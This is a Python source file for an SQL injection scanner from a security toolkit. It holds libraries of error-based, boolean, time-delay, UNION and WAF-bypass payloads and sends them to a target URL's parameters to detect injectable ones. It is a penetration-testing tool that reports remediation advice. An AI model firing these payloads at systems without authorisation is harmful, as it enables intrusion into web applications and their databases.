#!/usr/bin/env python3
"""
REVUEX Enhanced SQLi Scanner
============================

Advanced SQL Injection vulnerability scanner with multiple detection techniques.

Features:
- Error-based SQL injection detection
- Boolean-based blind SQL injection
- Time-based blind SQL injection
- UNION-based injection
- Stacked queries detection
- Multiple DBMS fingerprinting (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
- WAF bypass techniques
- Comprehensive payload library

Detection Techniques:
1. Error-based - Triggers database errors in response
2. Boolean-based - Detects differences in true/false responses
3. Time-based - Uses delays to confirm injection
4. UNION-based - Extracts data via UNION SELECT

Author: REVUEX Team
License: MIT
"""

import re
import sys
import argparse
import hashlib
import time
import difflib
from pathlib import Path
from datetime import datetime, timezone
from typing import Optional, Dict, Any, List, Set, Tuple
from dataclasses import dataclass, field
from urllib.parse import urlparse, urlencode, parse_qs, quote, unquote
from enum import Enum

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.base_scanner import (
    BaseScanner,
    Finding,
    ScanResult,
    Severity,
    ScanStatus,
)
from core.utils import (
    normalize_url,
    extract_domain,
    random_string,
    print_success,
    print_error,
    print_warning,
    print_info,
)


# =============================================================================
# CONSTANTS
# =============================================================================

SCANNER_NAME = "SQLi Scanner"
SCANNER_VERSION = "1.0.0"


class DBMSType(Enum):
    """Database Management System types"""
    MYSQL = "mysql"
    POSTGRESQL = "postgresql"
    MSSQL = "mssql"
    ORACLE = "oracle"
    SQLITE = "sqlite"
    UNKNOWN = "unknown"


# SQL error patterns by DBMS
SQL_ERRORS = {
    DBMSType.MYSQL: [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL server version",
        r"MySqlClient\.",
        r"com\.mysql\.jdbc",
        r"mysqli_",
        r"mysql_fetch",
        r"mysql_num_rows",
    ],
    DBMSType.POSTGRESQL: [
        r"PostgreSQL.*ERROR",
        r"Warning.*\Wpg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"PG::SyntaxError:",
        r"org\.postgresql\.util\.PSQLException",
        r"ERROR:\s+syntax error at or near",
        r"PostgreSQL query failed",
    ],
    DBMSType.MSSQL: [
        r"Driver.* SQL[\-\_\ ]*Server",
        r"OLE DB.* SQL Server",
        r"Warning.*mssql_",
        r"System\.Data\.SqlClient\.",
        r"Microsoft SQL Native Client error",
        r"\[SQL Server\]",
        r"ODBC SQL Server Driver",
        r"SQLServer JDBC Driver",
        r"com\.microsoft\.sqlserver\.jdbc",
        r"Unclosed quotation mark",
    ],
    DBMSType.ORACLE: [
        r"\bORA-[0-9][0-9][0-9][0-9]",
        r"Oracle error",
        r"Oracle.*Driver",
        r"Warning.*\Woci_",
        r"Warning.*\Wora_",
        r"oracle\.jdbc\.driver",
        r"quoted string not properly terminated",
        r"SQL command not properly ended",
    ],
    DBMSType.SQLITE: [
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"\[SQLITE_ERROR\]",
        r"SQLite error \d+:",
        r"sqlite3.OperationalError:",
    ],
}

# Generic SQL error patterns
GENERIC_SQL_ERRORS = [
    r"SQL syntax",
    r"sql error",
    r"syntax error",
    r"database error",
    r"query failed",
    r"unexpected end of SQL",
    r"invalid query",
    r"unterminated string",
    r"SQL command",
    r"SQLSTATE",
    r"JDBC",
    r"Query Error",
]

# Error-based payloads
ERROR_PAYLOADS = [
    "'",
    "\"",
    "`",
    "'--",
    "\"--",
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "' OR '1'='1'--",
    "\" OR \"1\"=\"1\"--",
    "' OR '1'='1'/*",
    "1' OR '1'='1",
    "')",
    "'))",
    "')--",
    "'))--",
    "'/*",
    "'#",
    "' -- ",
    "';--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
    "' UNION SELECT NULL--",
]

# Boolean-based payloads (true/false pairs)
BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),
    ("\" OR \"1\"=\"1", "\" OR \"1\"=\"2"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("\" OR 1=1--", "\" OR 1=2--"),
    ("' AND '1'='1", "' AND '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("' AND 1=1--", "' AND 1=2--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("1 OR 1=1", "1 OR 1=2"),
    ("1) OR (1=1", "1) OR (1=2"),
    ("' OR '1'='1'/*", "' OR '1'='2'/*"),
    ("' OR 1=1#", "' OR 1=2#"),
]

# Time-based payloads by DBMS
TIME_PAYLOADS = {
    DBMSType.MYSQL: [
        "' AND SLEEP({delay})--",
        "\" AND SLEEP({delay})--",
        "' OR SLEEP({delay})--",
        "1' AND SLEEP({delay})--",
        "' AND (SELECT * FROM (SELECT SLEEP({delay}))a)--",
    ],
    DBMSType.POSTGRESQL: [
        "' AND pg_sleep({delay})--",
        "\" AND pg_sleep({delay})--",
        "' OR pg_sleep({delay})--",
        "'; SELECT pg_sleep({delay})--",
    ],
    DBMSType.MSSQL: [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "' WAITFOR DELAY '0:0:{delay}'--",
        "\" WAITFOR DELAY '0:0:{delay}'--",
        "1; WAITFOR DELAY '0:0:{delay}'--",
    ],
    DBMSType.ORACLE: [
        "' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
        "' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})--",
    ],
    DBMSType.SQLITE: [
        "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))--",
    ],
}

# UNION-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "\" UNION SELECT NULL--",
    "\" UNION SELECT NULL,NULL--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT NULL,NULL--",
    ") UNION SELECT NULL--",
]

# WAF bypass techniques
WAF_BYPASS_PAYLOADS = [
    "' oR '1'='1",
    "' Or '1'='1",
    "' OR/**/1=1--",
    "'/**/OR/**/1=1--",
    "%27%20OR%20%271%27%3D%271",
    "%2527%2520OR%2520%25271%2527%253D%25271",
    "'\tOR\t'1'='1",
    "'\nOR\n'1'='1",
    "'%09OR%09'1'='1",
    "'%0aOR%0a'1'='1",
    "'/*!50000OR*/'1'='1",
    "' OR 'a'='a",
]

# SQL injection prone parameters
SQLI_PARAMS = [
    "id", "user", "userid", "user_id", "uid",
    "name", "username", "uname",
    "pass", "password", "pwd",
    "email", "mail",
    "search", "query", "q", "s", "keyword",
    "cat", "category", "catid", "category_id",
    "page", "pageid", "page_id", "p",
    "item", "itemid", "item_id", "product", "productid",
    "article", "articleid", "news", "newsid",
    "order", "orderid", "sort", "sortby", "orderby",
    "filter", "type", "typeid",
    "file", "path", "dir",
    "year", "month", "day", "date",
    "from", "to", "start", "end",
    "limit", "offset", "where",
]


# =============================================================================
# SQLi SCANNER CLASS
# =============================================================================

class SQLiScanner(BaseScanner):
    """
    Advanced SQL Injection vulnerability scanner.
    
    Usage:
        scanner = SQLiScanner(
            target="https://example.com/search?q=test",
            time_delay=5,
            test_all_params=True
        )
        result = scanner.run()
    """
    
    def __init__(
        self,
        target: str,
        time_delay: int = 5,
        test_all_params: bool = False,
        test_waf_bypass: bool = True,
        dbms: Optional[str] = None,
        level: int = 1,
        custom_payloads: Optional[List[str]] = None,
        **kwargs
    ):
        """
        Initialize SQLi Scanner.
        
        Args:
            target: Target URL with parameters to test
            time_delay: Delay in seconds for time-based detection
            test_all_params: Test all parameters, not just SQLi-prone ones
            test_waf_bypass: Test WAF bypass techniques
            dbms: Specific DBMS to target
            level: Scan intensity (1=basic, 2=thorough, 3=aggressive)
            custom_payloads: Additional custom payloads
        """
        super().__init__(target=target, **kwargs)
        
        self.time_delay = time_delay
        self.test_all_params = test_all_params
        self.test_waf_bypass = test_waf_bypass
        self.target_dbms = DBMSType(dbms) if dbms else None
        self.level = min(max(level, 1), 3)
        self.custom_payloads = custom_payloads or []
        
        # Detection state
        self.baseline_responses: Dict[str, Dict] = {}
        self.detected_dbms: Optional[DBMSType] = None
        self.vulnerable_params: Set[str] = set()
        self.tested_combinations: Set[str] = set()
        
        self.scanner_name = SCANNER_NAME
        self.scanner_version = SCANNER_VERSION
    
    def _validate_target(self) -> bool:
        """Validate target is accessible"""
        try:
            response = self.session.get(self.target, timeout=self.timeout, allow_redirects=True)
            return response.status_code < 500
        except Exception as e:
            self.logger.error(f"Target validation failed: {e}")
            return False
    
    def scan(self) -> None:
        """Execute SQL injection scan"""
        self.logger.info(f"Starting SQLi scan on {self.target}")
        
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query, keep_blank_values=True)
        
        if not params:
            self.logger.warning("No parameters found in URL")
            return
        
        flat_params = {k: v[0] if v else "" for k, v in params.items()}
        self._capture_baseline(flat_params)
        
        params_to_test = self._select_params(flat_params)
        self.logger.info(f"Testing {len(params_to_test)} parameter(s)")
        
        for param in params_to_test:
            if param in self.vulnerable_params:
                continue
            
            self.logger.info(f"Testing parameter: {param}")
            
            # 1. Error-based detection
            self._test_error_based(param, flat_params)
            
            # 2. Boolean-based blind detection
            self._test_boolean_based(param, flat_params)
            
            # 3. Time-based blind detection
            if self.level >= 2:
                self._test_time_based(param, flat_params)
            
            # 4. UNION-based detection
            if self.level >= 2:
                self._test_union_based(param, flat_params)
            
            # 5. WAF bypass techniques
            if self.test_waf_bypass and param not in self.vulnerable_params:
                self._test_waf_bypass(param, flat_params)
        
        self.logger.info(f"SQLi scan complete. Found {len(self.findings)} issue(s)")
    
    def _select_params(self, params: Dict[str, str]) -> List[str]:
        """Select parameters to test"""
        if self.test_all_params:
            return list(params.keys())
        
        priority_params = []
        other_params = []
        
        for param in params:
            if param.lower() in [p.lower() for p in SQLI_PARAMS]:
                priority_params.append(param)
            else:
                other_params.append(param)
        
        if self.level >= 2:
            return priority_params + other_params
        return priority_params if priority_params else other_params[:3]
    
    def _capture_baseline(self, params: Dict[str, str]) -> None:
        """Capture baseline response for comparison"""
        try:
            response = self._make_request(self.target)
            if response:
                self.baseline_responses["original"] = {
                    "status": response.status_code,
                    "length": len(response.text),
                    "content": response.text[:5000],
                    "hash": hashlib.md5(response.text.encode()).hexdigest(),
                }
        except Exception as e:
            self.logger.debug(f"Baseline capture failed: {e}")
    
    def _test_error_based(self, param: str, params: Dict[str, str]) -> None:
        """Test for error-based SQL injection"""
        self.logger.debug(f"Testing error-based SQLi on {param}")
        
        for payload in ERROR_PAYLOADS:
            if param in self.vulnerable_params:
                break
            
            combo_key = f"error:{param}:{payload}"
            if combo_key in self.tested_combinations:
                continue
            self.tested_combinations.add(combo_key)
            
            test_params = params.copy()
            original_value = test_params.get(param, "")
            test_params[param] = original_value + payload
            
            response = self._make_request_with_params(test_params)
            if response is None:
                continue
            
            error_match = self._detect_sql_error(response.text)
            if error_match:
                dbms, error_pattern = error_match
                self.detected_dbms = dbms
                self.vulnerable_params.add(param)
                
                finding = Finding(
                    id=self._generate_finding_id(f"sqli_error_{param}_{payload}"),
                    title=f"SQL Injection (Error-Based) - {dbms.value.upper()}",
                    severity=Severity.CRITICAL,
                    description=(
                        f"Error-based SQL injection vulnerability detected in the '{param}' "
                        f"parameter. The application returns database error messages revealing "
                        f"a {dbms.value.upper()} database backend."
                    ),
                    url=self.target,
                    parameter=param,
                    payload=payload,
                    evidence=f"Error pattern: {error_pattern}",
                    impact=(
                        "An attacker can:\n"
                        "- Extract sensitive data from the database\n"
                        "- Bypass authentication\n"
                        "- Modify or delete data\n"
                        "- Potentially execute system commands"
                    ),
                    remediation=(
                        "1. Use parameterized queries (prepared statements)\n"
                        "2. Use stored procedures\n"
                        "3. Implement input validation with allowlists\n"
                        "4. Apply principle of least privilege to database accounts\n"
                        "5. Disable detailed error messages in production"
                    ),
                    vulnerability_type="sqli",
                    confidence="high",
                )
                self.add_finding(finding)
                break
    
    def _test_boolean_based(self, param: str, params: Dict[str, str]) -> None:
        """Test for boolean-based blind SQL injection"""
        self.logger.debug(f"Testing boolean-based SQLi on {param}")
        
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            if param in self.vulnerable_params:
                break
            
            combo_key = f"boolean:{param}:{true_payload}"
            if combo_key in self.tested_combinations:
                continue
            self.tested_combinations.add(combo_key)
            
            original_value = params.get(param, "")
            
            true_params = params.copy()
            true_params[param] = original_value + true_payload
            true_response = self._make_request_with_params(true_params)
            
            if true_response is None:
                continue
            
            false_params = params.copy()
            false_params[param] = original_value + false_payload
            false_response = self._make_request_with_params(false_params)
            
            if false_response is None:
                continue
            
            if self._responses_differ_significantly(true_response, false_response):
                baseline = self.baseline_responses.get("original", {})
                true_similar = self._response_similar_to_baseline(true_response, baseline)
                false_different = not self._response_similar_to_baseline(false_response, baseline)
                
                if true_similar and false_different:
                    self.vulnerable_params.add(param)
                    
                    finding = Finding(
                        id=self._generate_finding_id(f"sqli_boolean_{param}"),
                        title="SQL Injection (Boolean-Based Blind)",
                        severity=Severity.HIGH,
                        description=(
                            f"Boolean-based blind SQL injection detected in the '{param}' "
                            f"parameter. The application responds differently to TRUE and "
                            f"FALSE SQL conditions."
                        ),
                        url=self.target,
                        parameter=param,
                        payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
                        evidence=(
                            f"TRUE response length: {len(true_response.text)}, "
                            f"FALSE response length: {len(false_response.text)}"
                        ),
                        impact=(
                            "An attacker can extract database contents character by "
                            "character by observing response differences."
                        ),
                        remediation=(
                            "1. Use parameterized queries (prepared statements)\n"
                            "2. Implement strict input validation\n"
                            "3. Use ORM frameworks properly"
                        ),
                        vulnerability_type="sqli",
                        confidence="high",
                    )
                    self.add_finding(finding)
                    break
    
    def _test_time_based(self, param: str, params: Dict[str, str]) -> None:
        """Test for time-based blind SQL injection"""
        self.logger.debug(f"Testing time-based SQLi on {param}")
        
        if self.detected_dbms:
            dbms_list = [self.detected_dbms]
        elif self.target_dbms:
            dbms_list = [self.target_dbms]
        else:
            dbms_list = [DBMSType.MYSQL, DBMSType.MSSQL, DBMSType.POSTGRESQL]
        
        for dbms in dbms_list:
            if param in self.vulnerable_params:
                break
            
            payloads = TIME_PAYLOADS.get(dbms, [])
            
            for payload_template in payloads[:3]:
                if param in self.vulnerable_params:
                    break
                
                payload = payload_template.format(delay=self.time_delay)
                
                combo_key = f"time:{param}:{payload}"
                if combo_key in self.tested_combinations:
                    continue
                self.tested_combinations.add(combo_key)
                
                original_value = params.get(param, "")
                test_params = params.copy()
                test_params[param] = original_value + payload
                
                start_time = time.time()
                response = self._make_request_with_params(test_params)
                elapsed = time.time() - start_time
                
                if response is None:
                    continue
                
                if elapsed >= (self.time_delay - 1):
                    start_time = time.time()
                    self._make_request_with_params(test_params)
                    elapsed2 = time.time() - start_time
                    
                    if elapsed2 >= (self.time_delay - 1):
                        self.vulnerable_params.add(param)
                        self.detected_dbms = dbms
                        
                        finding = Finding(
                            id=self._generate_finding_id(f"sqli_time_{param}_{dbms.value}"),
                            title=f"SQL Injection (Time-Based Blind) - {dbms.value.upper()}",
                            severity=Severity.HIGH,
                            description=(
                                f"Time-based blind SQL injection detected in the '{param}' "
                                f"parameter. The application delays {self.time_delay} seconds."
                            ),
                            url=self.target,
                            parameter=param,
                            payload=payload,
                            evidence=f"Response delayed by {elapsed:.2f}s",
                            impact="An attacker can extract database contents by measuring response times.",
                            remediation=(
                                "1. Use parameterized queries\n"
                                "2. Implement query timeouts\n"
                                "3. Monitor for slow queries"
                            ),
                            vulnerability_type="sqli",
                            confidence="high",
                        )
                        self.add_finding(finding)
                        break
    
    def _test_union_based(self, param: str, params: Dict[str, str]) -> None:
        """Test for UNION-based SQL injection"""
        self.logger.debug(f"Testing UNION-based SQLi on {param}")
        
        for payload in UNION_PAYLOADS:
            if param in self.vulnerable_params:
                break
            
            combo_key = f"union:{param}:{payload}"
            if combo_key in self.tested_combinations:
                continue
            self.tested_combinations.add(combo_key)
            
            original_value = params.get(param, "")
            test_params = params.copy()
            test_params[param] = original_value + payload
            
            response = self._make_request_with_params(test_params)
            if response is None:
                continue
            
            if self._detect_union_success(response.text, payload):
                self.vulnerable_params.add(param)
                column_count = payload.count("NULL")
                
                finding = Finding(
                    id=self._generate_finding_id(f"sqli_union_{param}"),
                    title="SQL Injection (UNION-Based)",
                    severity=Severity.CRITICAL,
                    description=(
                        f"UNION-based SQL injection detected in the '{param}' parameter "
                        f"with approximately {column_count} column(s)."
                    ),
                    url=self.target,
                    parameter=param,
                    payload=payload,
                    evidence=f"UNION injection successful with {column_count} columns",
                    impact="An attacker can directly extract data from other database tables.",
                    remediation=(
                        "1. Use parameterized queries\n"
                        "2. Implement strict output encoding\n"
                        "3. Apply column-level permissions"
                    ),
                    vulnerability_type="sqli",
                    confidence="high",
                )
                self.add_finding(finding)
                break
    
    def _test_waf_bypass(self, param: str, params: Dict[str, str]) -> None:
        """Test WAF bypass techniques"""
        self.logger.debug(f"Testing WAF bypass on {param}")
        
        for payload in WAF_BYPASS_PAYLOADS[:10]:
            combo_key = f"waf:{param}:{payload}"
            if combo_key in self.tested_combinations:
                continue
            self.tested_combinations.add(combo_key)
            
            original_value = params.get(param, "")
            test_params = params.copy()
            test_params[param] = original_value + payload
            
            response = self._make_request_with_params(test_params)
            if response is None:
                continue
            
            error_match = self._detect_sql_error(response.text)
            if error_match:
                dbms, _ = error_match
                self.vulnerable_params.add(param)
                
                finding = Finding(
                    id=self._generate_finding_id(f"sqli_waf_bypass_{param}"),
                    title="SQL Injection (WAF Bypass)",
                    severity=Severity.CRITICAL,
                    description=(
                        f"SQL injection vulnerability detected using WAF bypass in '{param}' parameter."
                    ),
                    url=self.target,
                    parameter=param,
                    payload=payload,
                    evidence=f"WAF bypass successful, {dbms.value} detected",
                    impact="WAF can be bypassed, allowing SQL injection attacks.",
                    remediation=(
                        "1. Fix the underlying SQL injection vulnerability\n"
                        "2. Update WAF rules\n"
                        "3. Use parameterized queries"
                    ),
                    vulnerability_type="sqli",
                    confidence="high",
                )
                self.add_finding(finding)
                break
    
    def _detect_sql_error(self, content: str) -> Optional[Tuple[DBMSType, str]]:
        """Detect SQL errors and identify DBMS"""
        for dbms, patterns in SQL_ERRORS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    return (dbms, pattern)
        
        for pattern in GENERIC_SQL_ERRORS:
            if re.search(pattern, content, re.IGNORECASE):
                return (DBMSType.UNKNOWN, pattern)
        
        return None
    
    def _detect_union_success(self, content: str, payload: str) -> bool:
        """Detect if UNION injection was successful"""
        null_count = content.lower().count("null")
        baseline_content = self.baseline_responses.get("original", {}).get("content", "").lower()
        
        return null_count > 0 and "null" not in baseline_content
    
    def _responses_differ_significantly(self, resp1, resp2) -> bool:
        """Check if two responses differ significantly"""
        len_diff = abs(len(resp1.text) - len(resp2.text))
        if len_diff > 50:
            return True
        
        similarity = difflib.SequenceMatcher(None, resp1.text[:1000], resp2.text[:1000]).ratio()
        if similarity < 0.9:
            return True
        
        if resp1.status_code != resp2.status_code:
            return True
        
        return False
    
    def _response_similar_to_baseline(self, response, baseline: Dict) -> bool:
        """Check if response is similar to baseline"""
        if not baseline:
            return True
        
        baseline_len = baseline.get("length", 0)
        if abs(len(response.text) - baseline_len) > 100:
            return False
        
        response_hash = hashlib.md5(response.text.encode()).hexdigest()
        if response_hash == baseline.get("hash"):
            return True
        
        similarity = difflib.SequenceMatcher(
            None, response.text[:1000], baseline.get("content", "")[:1000]
        ).ratio()
        
        return similarity > 0.8
    
    def _make_request_with_params(self, params: Dict[str, str]):
        """Make request with modified parameters"""
        parsed = urlparse(self.target)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        test_url = f"{base_url}?{urlencode(params)}"
        return self._make_request(test_url)
    
    def _make_request(self, url: str, method: str = "GET", data: Optional[Dict] = None):
        """Make HTTP request with rate limiting"""
        self.rate_limiter.acquire()
        self.request_count += 1
        
        try:
            if method.upper() == "GET":
                response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                response = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
            
            time.sleep(self.delay)
            return response
        except Exception as e:
            self.logger.debug(f"Request failed: {e}")
            return None
    
    def _generate_finding_id(self, context: str) -> str:
        """Generate unique finding ID"""
        data = f"{self.target}:{context}:{datetime.now().isoformat()}"
        return hashlib.md5(data.encode()).hexdigest()[:12]


# =============================================================================
# CLI INTERFACE
# =============================================================================

def create_parser() -> argparse.ArgumentParser:
    """Create CLI argument parser"""
    parser = argparse.ArgumentParser(
        prog="revuex-sqli",
        description="REVUEX SQLi Scanner - SQL Injection Detection",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
    %(prog)s -t "https://example.com/search?q=test"
    %(prog)s -t "https://example.com/user?id=1" --level 2
    %(prog)s -t "https://example.com/api?item=123" --dbms mysql -v

Author: REVUEX Team
License: MIT
        """
    )
    
    parser.add_argument("-t", "--target", required=True, help="Target URL with parameters")
    parser.add_argument("--level", type=int, choices=[1, 2, 3], default=1, help="Scan intensity")
    parser.add_argument("--dbms", choices=["mysql", "postgresql", "mssql", "oracle", "sqlite"], help="Target DBMS")
    parser.add_argument("--time-delay", type=int, default=5, help="Time-based delay (default: 5)")
    parser.add_argument("--all-params", action="store_true", help="Test all parameters")
    parser.add_argument("--no-waf-bypass", action="store_true", help="Skip WAF bypass testing")
    parser.add_argument("-p", "--payloads", nargs="+", help="Custom payloads")
    parser.add_argument("-o", "--output", help="Output file (JSON)")
    parser.add_argument("--delay", type=float, default=0.5, help="Request delay (default: 0.5)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
    parser.add_argument("--proxy", help="HTTP proxy")
    parser.add_argument("--cookie", help="Cookie string")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    parser.add_argument("-q", "--quiet", action="store_true", help="Quiet mode")
    
    return parser


def main() -> int:
    """Main entry point"""
    parser = create_parser()
    args = parser.parse_args()
    
    if not args.quiet:
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║  REVUEX SQLi Scanner v{SCANNER_VERSION}                             ║
║  SQL Injection Vulnerability Detection                    ║
╚═══════════════════════════════════════════════════════════╝
        """)
    
    scanner = SQLiScanner(
        target=args.target,
        time_delay=args.time_delay,
        test_all_params=args.all_params,
        test_waf_bypass=not args.no_waf_bypass,
        dbms=args.dbms,
        level=args.level,
        custom_payloads=args.payloads or [],
        delay=args.delay,
        timeout=args.timeout,
        proxy=args.proxy,
        verbose=args.verbose,
    )
    
    if args.cookie:
        scanner.session.headers["Cookie"] = args.cookie
    
    result = scanner.run()
    
    if not args.quiet:
        print(f"\n{'='*60}")
        print(f"Scan Complete")
        print(f"{'='*60}")
        print(f"Target: {args.target}")
        print(f"Duration: {result.duration_seconds:.2f}s")
        print(f"Requests: {result.total_requests}")
        print(f"Findings: {len(result.findings)}")
        
        if scanner.detected_dbms:
            print(f"Detected DBMS: {scanner.detected_dbms.value.upper()}")
        
        if result.findings:
            print(f"\n{'='*60}")
            print("Findings:")
            print(f"{'='*60}")
            for finding in result.findings:
                severity_color = {
                    Severity.CRITICAL: "\033[95m",
                    Severity.HIGH: "\033[91m",
                    Severity.MEDIUM: "\033[93m",
                    Severity.LOW: "\033[94m",
                    Severity.INFO: "\033[96m",
                }.get(finding.severity, "")
                reset = "\033[0m"
                
                print(f"\n{severity_color}[{finding.severity.value.upper()}]{reset} {finding.title}")
                print(f"  Parameter: {finding.parameter}")
                print(f"  Payload: {finding.payload}")
    
    if args.output:
        import json
        output_data = {
            "target": args.target,
            "scan_id": result.scan_id,
            "duration": result.duration_seconds,
            "detected_dbms": scanner.detected_dbms.value if scanner.detected_dbms else None,
            "findings": [
                {
                    "id": f.id,
                    "title": f.title,
                    "severity": f.severity.value,
                    "parameter": f.parameter,
                    "payload": f.payload,
                    "evidence": f.evidence,
                    "remediation": f.remediation,
                }
                for f in result.findings
            ]
        }
        
        with open(args.output, "w") as f:
            json.dump(output_data, f, indent=2)
        
        if not args.quiet:
            print(f"\nResults saved to: {args.output}")
    
    return 1 if result.findings else 0


if __name__ == "__main__":
    sys.exit(main())